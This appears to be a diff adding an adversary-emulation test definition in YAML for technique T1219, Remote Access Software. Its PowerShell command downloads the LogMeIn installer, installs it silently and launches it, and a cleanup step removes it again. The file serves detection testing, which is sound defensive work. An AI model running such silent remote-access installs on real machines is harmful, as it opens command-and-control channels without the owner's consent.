@@ -1,0 +1,16 @@
+- id: 4368f6a0-ce15-588d-be39-d8902df72bfd
+  name: Soumaia ART Tests - LogMeIn Files Detected Test on Windows
+  description: An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed. (requires elevation)
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: |-
+          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
+          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+          Start-Process -Wait $file1 /quiet;
+          Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
+        cleanup: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore"
